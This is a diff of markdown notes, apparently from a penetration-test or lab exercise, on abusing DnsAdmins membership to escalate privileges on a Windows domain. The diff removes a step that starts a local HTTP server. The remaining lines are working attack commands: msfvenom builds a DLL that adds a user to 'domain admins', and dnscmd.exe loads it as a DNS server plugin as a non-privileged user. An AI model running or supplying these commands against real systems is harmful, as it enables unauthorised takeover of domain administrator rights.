@@ -3,11 +3,6 @@
 msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
 ```
 
-# Starting Local HTTP Server
-```powershell
-python3 -m http.server 7777
-```
-
 # Loading DLL as Non-Privileged User
 ```powershell
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
